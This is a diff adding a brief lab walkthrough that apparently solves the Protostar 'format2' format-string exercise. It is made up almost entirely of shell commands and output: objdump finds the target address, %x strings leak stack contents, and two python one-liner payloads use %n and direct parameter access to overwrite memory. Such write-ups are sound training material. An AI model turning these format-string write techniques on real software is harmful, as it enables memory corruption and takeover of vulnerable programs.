@@ -1,0 +1,28 @@
+$ objdump -t format2 | grep target
+080496e4 g     O .bss	00000004              target
+
+Method 1
+==================
+- get to the format string on the stack:
+Check the rooom we have for storing the buffer (should be < 512):
+$  python -c 'print len("ABCD" + "X"* 3 + "%x"*250)'
+507
+$ python -c 'print "ABCD" + "X"* 3 + "%x"*250' | ./format2  | grep --color="auto" 41
+ABCDXXX200b7fd8420bffff614444342412.....
+
+$ python -c 'print "ABCD" + "X"* 3 + "%x"*4' | ./format2  
+ABCDXXX200b7fd8420bffff61444434241
+target is 0 :(
+
+This one is easy - we have only one byte to modify
+$ python -c 'print "\xe4\x96\x04\x08" + "X"* 3 + "%019x"*3 + "%n"' | ./format2  
+��XXX000000000000000020000000000000b7fd842000000000000bffff614
+you have modified the target :)
+
+Method 2
+==================
+And with direct parameter access
+python -c 'print "\xe4\x96\x04\x08"  + "%7$60x" + "%4$n"' | ./format2  
+��                                                       a6e24
+you have modified the target :)
+
